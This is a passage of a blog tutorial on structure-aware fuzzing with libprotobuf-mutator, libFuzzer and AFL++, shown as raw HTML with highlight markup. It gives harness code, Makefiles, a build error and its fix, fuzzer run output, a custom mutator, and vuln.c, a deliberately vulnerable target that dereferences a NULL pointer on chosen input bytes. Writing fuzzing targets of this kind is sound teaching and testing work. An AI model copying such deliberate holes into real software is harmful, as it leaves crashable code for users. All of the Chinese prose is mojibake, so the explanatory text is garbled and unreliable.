class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;libprotobuf-mutator/src/libfuzzer/libfuzzer_macro.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;test.pb.h&quot;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><br><span class="hljs-keyword">using</span> std::cin;<br><span class="hljs-keyword">using</span> std::cout;<br><span class="hljs-keyword">using</span> std::endl;<br><br><span class="hljs-function">std::string <span class="hljs-title">ProtoToData</span><span class="hljs-params">(<span class="hljs-type">const</span> TEST &amp;test_proto)</span> </span>&#123;<br>    std::stringstream all;<br>    <span class="hljs-type">const</span> <span class="hljs-keyword">auto</span> &amp;aa = test_proto.<span class="hljs-built_in">a</span>();<br>    <span class="hljs-type">const</span> <span class="hljs-keyword">auto</span> &amp;bb = test_proto.<span class="hljs-built_in">b</span>();<br>    all.<span class="hljs-built_in">write</span>((<span class="hljs-type">const</span> <span class="hljs-type">char</span>*)&amp;aa, <span class="hljs-built_in">sizeof</span>(aa));<br>    <span class="hljs-keyword">if</span>(bb.<span class="hljs-built_in">size</span>() != <span class="hljs-number">0</span>) &#123;<br>        all.<span class="hljs-built_in">write</span>(bb.<span class="hljs-built_in">c_str</span>(), bb.<span class="hljs-built_in">size</span>());<br>    &#125;<br><br>    std::string res = all.<span class="hljs-built_in">str</span>();<br>    <span class="hljs-keyword">if</span> (bb.<span class="hljs-built_in">size</span>() != <span class="hljs-number">0</span> &amp;&amp; res.<span class="hljs-built_in">size</span>() != <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-comment">// set PROTO_FUZZER_DUMP_PATH env to dump the serialized protobuf</span><br>        <span class="hljs-keyword">if</span> (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *dump_path = <span class="hljs-built_in">getenv</span>(<span class="hljs-string">&quot;PROTO_FUZZER_DUMP_PATH&quot;</span>)) &#123;<br>            <span class="hljs-function">std::ofstream <span class="hljs-title">of</span><span class="hljs-params">(dump_path)</span></span>;<br>            of.<span class="hljs-built_in">write</span>(res.<span class="hljs-built_in">data</span>(), res.<span class="hljs-built_in">size</span>());<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> res;<br>&#125;<br><br><span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span> <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">FuzzTEST</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">uint8_t</span>* data, <span class="hljs-type">size_t</span> size)</span></span>; <span class="hljs-comment">// our customized fuzzing function</span><br><br><span class="hljs-built_in">DEFINE_PROTO_FUZZER</span>(<span class="hljs-type">const</span> TEST &amp;test_proto) &#123;<br>    <span class="hljs-keyword">auto</span> s = <span class="hljs-built_in">ProtoToData</span>(test_proto); <span class="hljs-comment">// convert protobuf to raw data</span><br>    <span class="hljs-built_in">FuzzTEST</span>((<span class="hljs-type">const</span> <span class="hljs-type">uint8_t</span>*)s.<span class="hljs-built_in">data</span>(), s.<span class="hljs-built_in">size</span>()); <span class="hljs-comment">// fuzz the function</span><br>&#125;<br></code></pre></td></tr></table></figure><p>åœ¨æ–‡ä»¶çš„æœ€å¼€å¤´å¯¼å…¥ <code>libfuzzer_macro.h</code>ï¼Œ åé¢å°±å¯ä»¥ä½¿ç”¨ä¸€äº›å®æ¥å†™ä»£ç äº†ï¼Œ<code>DEFINE_PROTO_FUZZER</code> æ˜¯å…³é”®çš„ fuzzer å…¥å£ã€‚ç»“æ„åŒ–å˜å¼‚éƒ¨åˆ† libprotobuf-mutator å·²ç»å®Œæˆäº†ï¼Œéœ€è¦å®ç°çš„æ˜¯ä¸€ä¸ªç”± protobuf è½¬éœ€è¦çš„æ•°æ®ç±»å‹çš„å‡½æ•°ï¼Œå¦‚ä¸Šé¢çš„ <code>ProtoToData</code></p><h4 id="ä»£ç ç¼–è¯‘"><a href="#ä»£ç ç¼–è¯‘" class="headerlink" title="ä»£ç ç¼–è¯‘"></a>ä»£ç ç¼–è¯‘</h4><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs makefile">TARGET=lpm_libfuzz<br>CXX=clang++<br>CXXFLAGS=-g -fsanitize=fuzzer,address<br>PB_SRC=test.pb.cc<br><br>PROTOBUF_DIR=<span class="hljs-variable">$(HOME)</span>/code/libprotobuf-mutator/build/external.protobuf/<br>LPM_DIR=<span class="hljs-variable">$(HOME)</span>/code/AFL+/external/libprotobuf-mutator<br>PROTOBUF_LIB=<span class="hljs-variable">$(PROTOBUF_DIR)</span>/lib/libprotobufd.a<br>LPM_LIB=<span class="hljs-variable">$(LPM_DIR)</span>/lib/libprotobuf-mutator-libfuzzer.a <span class="hljs-variable">$(LPM_DIR)</span>/lib/libprotobuf-mutator.a<br>INC=-I<span class="hljs-variable">$(PROTOBUF_DIR)</span>/<span class="hljs-keyword">include</span> -I<span class="hljs-variable">$(LPM_DIR)</span>/<span class="hljs-keyword">include</span><br>DFUZZ=-DLLVMFuzzerTestOneInput=FuzzTEST<br><br><span class="hljs-section">all: <span class="hljs-variable">$(TARGET)</span></span><br><br><span class="hljs-comment"># for testing libprotobuf + libfuzzer</span><br><span class="hljs-comment"># compile harness first</span><br><span class="hljs-comment"># then link lpm_libfuzz with harness.o &amp; static libraries</span><br><span class="hljs-section">harness.o: harness.cc</span><br><span class="hljs-variable">$(CXX)</span> <span class="hljs-variable">$(CXXFLAGS)</span> -c <span class="hljs-variable">$(DFUZZ)</span> <span class="hljs-variable">$&lt;</span><br><br><span class="hljs-variable">$(TARGET)</span>: harness.o <span class="hljs-variable">$(TARGET)</span>.cc<br><span class="hljs-variable">$(CXX)</span> <span class="hljs-variable">$(CXXFLAGS)</span> -o <span class="hljs-variable">$@</span> <span class="hljs-variable">$^</span> <span class="hljs-variable">$(PB_SRC)</span> <span class="hljs-variable">$(LPM_LIB)</span> <span class="hljs-variable">$(PROTOBUF_LIB)</span> <span class="hljs-variable">$(INC)</span> <span class="hljs-comment"># $(LPM_LIB) must be placed before $(PROTOBUF_LIB)</span><br><br><span class="hljs-meta"><span class="hljs-keyword">.PHONY</span>: clean</span><br><span class="hljs-section">clean: </span><br>rm <span class="hljs-variable">$(TARGET)</span> *.o<br></code></pre></td></tr></table></figure><p>make åæŠ¥é”™ï¼Œæ‰¾ä¸åˆ°å¤´æ–‡ä»¶</p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs gauss">/home/henices/<span class="hljs-built_in">code</span>/AFL+/<span class="hljs-keyword">external</span>/libprotobuf-mutator/include/libprotobuf-mutator/src/libfuzzer/libfuzzer_macro.h:<span class="hljs-number">24</span>:<span class="hljs-number">10</span>: fatal <span class="hljs-built_in">error</span>: &#x27;port/protobuf.h&#x27; file <span class="hljs-keyword">not</span> found<br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;port/protobuf.h&quot;</span></span><br>         ^~~~~~~~~~~~~~~~~<br><span class="hljs-number">1</span> <span class="hljs-built_in">error</span> generated.<br></code></pre></td></tr></table></figure><p>port&#x2F;protobuf.h  æ¥è‡ª <a href="https://github.com/google/libprotobuf-mutator/blob/master/port/protobuf.h">https://github.com/google/libprotobuf-mutator/blob/master/port/protobuf.h</a>  ä¿®æ”¹ Makefile å¦‚ä¸‹</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs makefile">TARGET=lpm_libfuzz<br>CXX=clang++<br>CXXFLAGS=-g -fsanitize=fuzzer,address<br>PB_SRC=test.pb.cc<br><br>PROTOBUF_DIR=<span class="hljs-variable">$(HOME)</span>/code/libprotobuf-mutator/build/external.protobuf/<br>LPM_DIR=<span class="hljs-variable">$(HOME)</span>/code/AFL+/external/libprotobuf-mutator<br>PROTOBUF_LIB=<span class="hljs-variable">$(PROTOBUF_DIR)</span>/lib/libprotobufd.a<br>LPM_LIB=<span class="hljs-variable">$(LPM_DIR)</span>/lib/libprotobuf-mutator-libfuzzer.a <span class="hljs-variable">$(LPM_DIR)</span>/lib/libprotobuf-mutator.a<br>INC=-I<span class="hljs-variable">$(PROTOBUF_DIR)</span>/<span class="hljs-keyword">include</span> -I<span class="hljs-variable">$(HOME)</span>/code/libprotobuf-mutator/ -I<span class="hljs-variable">$(LPM_DIR)</span>/<span class="hljs-keyword">include</span><br>DFUZZ=-DLLVMFuzzerTestOneInput=FuzzTEST<br><br><span class="hljs-section">all: <span class="hljs-variable">$(TARGET)</span></span><br><br><span class="hljs-comment"># for testing libprotobuf + libfuzzer</span><br><span class="hljs-comment"># compile harness first</span><br><span class="hljs-comment"># then link lpm_libfuzz with harness.o &amp; static libraries</span><br><span class="hljs-section">harness.o: harness.cc</span><br><span class="hljs-variable">$(CXX)</span> <span class="hljs-variable">$(CXXFLAGS)</span> -c <span class="hljs-variable">$(DFUZZ)</span> <span class="hljs-variable">$&lt;</span><br><br><span class="hljs-variable">$(TARGET)</span>: harness.o <span class="hljs-variable">$(TARGET)</span>.cc<br><span class="hljs-variable">$(CXX)</span> <span class="hljs-variable">$(CXXFLAGS)</span> -o <span class="hljs-variable">$@</span> <span class="hljs-variable">$^</span> <span class="hljs-variable">$(PB_SRC)</span> <span class="hljs-variable">$(LPM_LIB)</span> <span class="hljs-variable">$(PROTOBUF_LIB)</span> <span class="hljs-variable">$(INC)</span> <span class="hljs-comment"># $(LPM_LIB) must be placed before $(PROTOBUF_LIB)</span><br><br><span class="hljs-meta"><span class="hljs-keyword">.PHONY</span>: clean</span><br><span class="hljs-section">clean: </span><br>rm <span class="hljs-variable">$(TARGET)</span> *.o<br></code></pre></td></tr></table></figure><p>ä¿®æ”¹ makefile åï¼Œå¯ä»¥æ­£å¸¸ç¼–è¯‘é€šè¿‡ã€‚ç»è¿‡æˆ‘ä»¬ä¸Šé¢çš„åˆ†æï¼Œä¸éœ€è¦å®šä¹‰ <code>DFUZZ=-DLLVMFuzzerTestOneInput=FuzzTEST</code> å°†è¿™è¡Œåˆ é™¤æ‰ï¼ŒåŒæ ·å¯ä»¥ç¼–è¯‘é€šè¿‡ã€‚</p><p>æ‰§è¡Œ <code>lpm_libfuzz</code> è¿è¡Œæ­£å¸¸</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs dts">âœ  ./lpm_libfuzz                                                                                                                                                                                          <br><span class="hljs-symbol">INFO:</span> found LLVMFuzzerCustomMutator (<span class="hljs-number">0x758a80</span>). Disabling -len_control by default.<br><span class="hljs-symbol">INFO:</span> Running with entropic power schedule (<span class="hljs-number">0xFF</span>, <span class="hljs-number">100</span>).                                    <br><span class="hljs-symbol">INFO:</span> Seed: <span class="hljs-number">331712324</span>                       <br><span class="hljs-symbol">INFO:</span> Loaded <span class="hljs-number">1</span> modules   (<span class="hljs-number">434</span> inline <span class="hljs-number">8</span>-bit counters): <span class="hljs-number">434</span> [<span class="hljs-number">0xa056b8</span>, <span class="hljs-number">0xa0586a</span>), <br><span class="hljs-symbol">INFO:</span> Loaded <span class="hljs-number">1</span> PC tables (<span class="hljs-number">434</span> PCs): <span class="hljs-number">434</span> [<span class="hljs-number">0x939398</span>,<span class="hljs-number">0x93aeb8</span>), <br><span class="hljs-symbol">INFO:</span> -max_len is not <span class="hljs-attr">provided</span><span class="hljs-punctuation">;</span> libFuzzer will not generate inputs larger than <span class="hljs-number">4096</span> bytes<br><span class="hljs-symbol">INFO:</span> A corpus is not provided, starting from an empty corpus<br><span class="hljs-meta">#2      INITED cov: 82 ft: 83 corp: 1/1b exec/s: 0 rss: 35Mb</span><br>        NEW_FUNC[<span class="hljs-number">1</span>/<span class="hljs-number">41</span>]: <span class="hljs-number">0x75abb0</span> in TEST::~TEST() <span class="hljs-keyword">/tmp/</span>genfiles/test.pb.cc:<span class="hljs-number">116</span><br>        NEW_FUNC[<span class="hljs-number">2</span>/<span class="hljs-number">41</span>]: <span class="hljs-number">0x75ca10</span> in google::protobuf::UnknownFieldSet* google::protobuf::internal::InternalMetadata::mutable_unknown_fields<span class="hljs-params">&lt;google::protobuf::UnknownFieldSet&gt;</span>() <span class="hljs-keyword">/home/</span>henices<span class="hljs-keyword">/code/</span>libprotobuf-mut<br>ator<span class="hljs-keyword">/build/</span>external.protobuf<span class="hljs-comment">//include/google/protobuf/metadata_lite.h:117</span><br><span class="hljs-meta">#3      NEW    cov: 135 ft: 159 corp: 2/12b lim: 4096 exec/s: 0 rss: 36Mb L: 11/11 MS: 1 CustomCrossOver-</span><br><span class="hljs-meta">#4      NEW    cov: 138 ft: 162 corp: 3/201b lim: 4096 exec/s: 0 rss: 36Mb L: 189/189 MS: 2 InsertRepeatedBytes-Custom-</span><br><span class="hljs-meta">#38     REDUCE cov: 138 ft: 162 corp: 3/127b lim: 4096 exec/s: 0 rss: 37Mb L: 115/115 MS: 5 CustomCrossOver-CustomCrossOver-Custom-InsertRepeatedBytes-Custom-</span><br><span class="hljs-meta">#60     REDUCE cov: 138 ft: 162 corp: 3/124b lim: 4096 exec/s: 0 rss: 37Mb L: 112/112 MS: 4 CustomCrossOver-ShuffleBytes-ChangeByte-Custom-</span><br><span class="hljs-meta">#98     REDUCE cov: 138 ft: 162 corp: 3/56b lim: 4096 exec/s: 0 rss: 37Mb L: 44/44 MS: 5 CrossOver-Custom-Custom-CMP-Custom- DE: <span class="hljs-string">&quot;~\xff\xff\xff\xff\xff\xff\xff&quot;</span>-</span><br><span class="hljs-meta">#144    REDUCE cov: 138 ft: 162 corp: 3/53b lim: 4096 exec/s: 0 rss: 37Mb L: 41/41 MS: 2 CrossOver-Custom-</span><br><span class="hljs-meta">#182    REDUCE cov: 138 ft: 162 corp: 3/25b lim: 4096 exec/s: 0 rss: 37Mb L: 13/13 MS: 5 ChangeBit-Custom-Custom-InsertByte-Custom-</span><br><span class="hljs-meta">#324    REDUCE cov: 138 ft: 162 corp: 3/24b lim: 4096 exec/s: 0 rss: 38Mb L: 12/12 MS: 3 CustomCrossOver-EraseBytes-Custom-</span><br></code></pre></td></tr></table></figure><h3 id="Handling-input-from-AFL-in-our-custom-mutator"><a href="#Handling-input-from-AFL-in-our-custom-mutator" class="headerlink" title="Handling input from AFL++ in our custom mutator"></a>Handling input from AFL++ in our custom mutator</h3><p><a href="https://github.com/bruce30262/libprotobuf-mutator_fuzzing_learning/tree/master/5_libprotobuf_aflpp_custom_mutator_input">https://github.com/bruce30262/libprotobuf-mutator_fuzzing_learning/tree/master/5_libprotobuf_aflpp_custom_mutator_input</a></p><p>ä¸»è¦å†…å®¹æ˜¯å°† libprotobuf-mutator å’Œ afl++ ç»“åˆèµ·æ¥ï¼Œä½¿ç”¨çš„ afl++ çš„ custom mutatorï¼Œå€¼å¾—ä¸€æçš„æ˜¯åœ¨è¿™ä¸ªä¾‹å­é‡Œï¼Œéœ€è¦ä½¿ç”¨ <code>-fPIC</code> å‚æ•°ç¼–è¯‘ libprotobuf-mutatorã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">cmake .. -GNinja -DCMAKE_C_COMPILER=clang -DLIB_PROTO_MUTATOR_DOWNLOAD_PROTOBUF=ON \<br>-DCMAKE_INSTALL_PREFIX=/home/henices/code/AFL+/external/libprotobuf-mutator \<br>-DCMAKE_CXX_COMPILER=clang++ -DCMAKE_BUILD_TYPE=Debug \<br>-DCMAKE_C_FLAGS=<span class="hljs-string">&quot;-fPIC&quot;</span> -DCMAKE_CXX_FLAGS=<span class="hljs-string">&quot;-fPIC&quot;</span><br></code></pre></td></tr></table></figure><p>ä¸»è¦çš„æ­¥éª¤åœ¨ <a href="https://github.com/bruce30262/libprotobuf-mutator_fuzzing_learning/blob/master/5_libprotobuf_aflpp_custom_mutator_input/README.md">readme.md</a> ä¸­å·²ç»ä»‹ç»å¾—æ¯”è¾ƒæ¸…æ¥šäº†ã€‚</p><ul><li><code>lpm_aflpp_custom_mutator_input.cc</code> æ˜¯ afl++ çš„ custom mutator shared library<ul><li>è§£æè¾“å…¥æ•°æ®ï¼ˆtestcase bufferï¼‰å¹¶å°†å…¶è½¬æˆ <code>TEST</code> protobuf message</li><li>ä½¿ç”¨ <code>libprotobuf-mutator</code> å˜å¼‚ <code>TEST</code> protobuf message</li><li>æ³¨å†Œä¸€ä¸ª <code>PostProcessor</code> å¤„ç†å˜å¼‚åçš„ <code>TEST</code> protobuf message ï¼ˆéå¿…è¦æ­¥éª¤ï¼‰</li></ul></li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span> <span class="hljs-function"><span class="hljs-type">size_t</span> <span class="hljs-title">afl_custom_fuzz</span><span class="hljs-params">(MyMutator *mutator, <span class="hljs-comment">// return value from afl_custom_init</span></span></span><br><span class="hljs-params"><span class="hljs-function">                       <span class="hljs-type">uint8_t</span> *buf, <span class="hljs-type">size_t</span> buf_size, <span class="hljs-comment">// input data to be mutated</span></span></span><br><span class="hljs-params"><span class="hljs-function">                       <span class="hljs-type">uint8_t</span> **out_buf, <span class="hljs-comment">// output buffer</span></span></span><br><span class="hljs-params"><span class="hljs-function">                       <span class="hljs-type">uint8_t</span> *add_buf, <span class="hljs-type">size_t</span> add_buf_size,  <span class="hljs-comment">// add_buf can be NULL</span></span></span><br><span class="hljs-params"><span class="hljs-function">                       <span class="hljs-type">size_t</span> max_size)</span> </span>&#123;<br>    <span class="hljs-comment">// This function can be named either &quot;afl_custom_fuzz&quot; or &quot;afl_custom_mutator&quot;</span><br>    <span class="hljs-comment">// A simple test shows that &quot;buf&quot; will be the content of the current test case</span><br>    <span class="hljs-comment">// &quot;add_buf&quot; will be the next test case ( from AFL++&#x27;s input queue )</span><br>    <br>    TEST input;<br>    <span class="hljs-comment">// parse input data to TEST</span><br>    <span class="hljs-comment">// Notice that input data should be a serialized protobuf data</span><br>    <span class="hljs-comment">// Check ./in/ii and test_protobuf_serializer for more detail</span><br>    <span class="hljs-type">bool</span> parse_ok = input.<span class="hljs-built_in">ParseFromArray</span>(buf, buf_size);<br>    <span class="hljs-keyword">if</span>(!parse_ok) &#123;<br>        <span class="hljs-comment">// Invalid serialize protobuf data. Don&#x27;t mutate.</span><br>        <span class="hljs-comment">// Return a dummy buffer. Also mutated_size = 0</span><br>        <span class="hljs-type">static</span> <span class="hljs-type">uint8_t</span> *dummy = <span class="hljs-keyword">new</span> <span class="hljs-type">uint8_t</span>[<span class="hljs-number">10</span>]; <span class="hljs-comment">// dummy buffer with no data</span><br>        *out_buf = dummy;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-comment">// mutate the protobuf</span><br>    mutator-&gt;<span class="hljs-built_in">Mutate</span>(&amp;input, max_size);<br>    <br>    <span class="hljs-comment">// Convert protobuf to raw data</span><br>    <span class="hljs-type">const</span> TEST *p = &amp;input;<br>    std::string s = <span class="hljs-built_in">ProtoToData</span>(*p);<br>    <span class="hljs-comment">// Copy to a new buffer ( mutated_out )</span><br>    <span class="hljs-type">size_t</span> mutated_size = s.<span class="hljs-built_in">size</span>() &lt;= max_size ? s.<span class="hljs-built_in">size</span>() : max_size; <span class="hljs-comment">// check if raw data&#x27;s size is larger than max_size</span><br>    <span class="hljs-type">uint8_t</span> *mutated_out = <span class="hljs-keyword">new</span> <span class="hljs-type">uint8_t</span>[mutated_size+<span class="hljs-number">1</span>];<br>    <span class="hljs-built_in">memcpy</span>(mutated_out, s.<span class="hljs-built_in">c_str</span>(), mutated_size); <span class="hljs-comment">// copy the mutated data</span><br>    <span class="hljs-comment">// Assign the mutated data and return mutated_size</span><br>    *out_buf = mutated_out;<br>    <span class="hljs-keyword">return</span> mutated_size;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>mutator-&gt;Mutate(&amp;input, max_size);</code> ä¸ºçœŸæ­£èµ·ä½œç”¨çš„æ ¸å¿ƒä»£ç </p><ul><li><code>lpm_aflpp_custom_mutator_input.h</code>  ç»§æ‰¿äº†protobuf_mutator::Mutatorï¼Œ å¯ä»¥ä½¿ç”¨ libprotobuf-mutator çš„ Mutate æ–¹æ³•</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;libprotobuf-mutator/src/mutator.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;test.pb.h&quot;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyMutator</span> : <span class="hljs-keyword">public</span> protobuf_mutator::Mutator &#123;<br>&#125;;<br></code></pre></td></tr></table></figure><ul><li><p><code>test_proto_serializer.cc</code></p><ul><li>ç”¨äºç”Ÿæˆä¸€æ¡åºåˆ—åŒ–çš„ <code>TEST</code> protobuf messageï¼Œå¯ä»¥ä½œä¸º fuzz çš„åˆå§‹åŒ– testcase ä½¿ç”¨</li></ul></li><li><p><code>vuln.c</code> æ¼æ´æµ‹è¯•ç¨‹åº</p></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;math.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> *argv[])</span><br>&#123;<br>    <span class="hljs-type">char</span> str[<span class="hljs-number">100</span>]=&#123;&#125;;<br>    read(<span class="hljs-number">0</span>, str, <span class="hljs-number">100</span>);<br>    <span class="hljs-type">int</span> *ptr = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-keyword">if</span>( str[<span class="hljs-number">0</span>] == <span class="hljs-string">&#x27;\x02&#x27;</span> || str[<span class="hljs-number">0</span>] == <span class="hljs-string">&#x27;\xe8&#x27;</span>) &#123;<br>        *ptr = <span class="hljs-number">123</span>; <br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>æ¼æ´æµ‹è¯•ç¨‹åºæ¯”è¾ƒç®€å•ï¼Œåªè¦ç¬¬ä¸€ä¸ªå­—èŠ‚æ˜¯ <code>0xe8</code> æˆ–è€… <code>0x02</code> å³å¯ï¼Œlibprotobuf-mutator çš„å˜å¼‚åœ¨è¿™ä¸ªä¾‹å­é‡Œæ•ˆç‡å¹¶ä¸é«˜ï¼Œæ‰€ä»¥éœ€è¦ä½¿ç”¨ <code>PostProcessor</code> æ¥ä¼˜åŒ–å˜å¼‚ã€‚</p><ul><li>Makefile</li></ul><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs makefile">TARGET=lpm_aflpp_custom_mutator_input<br>CXX=clang++-11<br>AFLCC=<span class="hljs-variable">$(HOME)</span>/AFLplusplus/afl-gcc<br>PB_SRC=test.pb.cc<br><br>PROTOBUF_DIR=<span class="hljs-variable">$(HOME)</span>/libprotobuf-mutator/build/external.protobuf<br>PROTOBUF_LIB=<span class="hljs-variable">$(PROTOBUF_DIR)</span>/lib/libprotobufd.a<br><br>LPM_DIR=<span class="hljs-variable">$(HOME)</span>/libprotobuf-mutator<br>LPM_LIB=<span class="hljs-variable">$(LPM_DIR)</span>/build/src/libfuzzer/libprotobuf-mutator-libfuzzer.a <span class="hljs-variable">$(LPM_DIR)</span>/build/src/libprotobuf-mutator.a<br><br>INC=-I<span class="hljs-variable">$(PROTOBUF_DIR)</span>/<span class="hljs-keyword">include</span> -I<span class="hljs-variable">$(LPM_DIR)</span><br><br><span class="hljs-section">all: <span class="hljs-variable">$(TARGET)</span>.so</span><br><br><span class="hljs-variable">$(TARGET)</span>.so: <span class="hljs-variable">$(TARGET)</span>.cc <span class="hljs-variable">$(PB_SRC)</span><br><span class="hljs-variable">$(CXX)</span> -fPIC -c <span class="hljs-variable">$^</span> <span class="hljs-variable">$(INC)</span><br><span class="hljs-variable">$(CXX)</span> -shared -Wall -O3 -o <span class="hljs-variable">$@</span> *.o <span class="hljs-variable">$(LPM_LIB)</span> <span class="hljs-variable">$(PROTOBUF_LIB)</span><br><br><span class="hljs-section">vuln: vuln.c</span><br><span class="hljs-variable">$(AFLCC)</span> -o <span class="hljs-variable">$@</span> <span class="hljs-variable">$^</span><br><br><span class="hljs-section">test_proto_serializer: test_proto_serializer.cc <span class="hljs-variable">$(PB_SRC)</span></span><br><span class="hljs-variable">$(CXX)</span> -o <span class="hljs-variable">$@</span> <span class="hljs-variable">$^</span> <span class="hljs-variable">$(PROTOBUF_LIB)</span> <span class="hljs-variable">$(INC)</span><br><br><span class="hljs-meta"><span class="hljs-keyword">.PHONY</span>: clean</span><br><span class="hljs-section">clean: </span><br>rm *.so *.o vuln test_proto_serializer<br></code></pre></td></tr></table></figure><p>Makefile æœ‰ç‘•ç–µï¼Œè¿™ä¸ªç« èŠ‚çš„å†…å®¹å’Œ libfuzzer æ²¡æœ‰å…³ç³»ï¼Œä¸éœ€è¦é“¾æ¥ 